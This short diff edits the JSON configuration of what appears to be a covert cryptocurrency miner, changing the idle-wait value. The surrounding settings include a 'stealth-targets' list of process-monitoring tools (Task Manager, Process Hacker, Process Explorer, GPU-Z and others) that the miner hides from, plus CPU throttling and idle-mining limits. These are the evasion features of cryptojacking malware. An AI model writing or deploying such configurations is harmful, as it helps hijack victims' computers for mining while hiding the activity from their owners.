@@ -7,7 +7,7 @@
     "nicehash": false,
     "ssltls": true,
     "max-cpu": 30,
-    "idle-wait": 33,
+    "idle-wait": 59,
     "idle-cpu": 50,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
     "kill-targets": "",
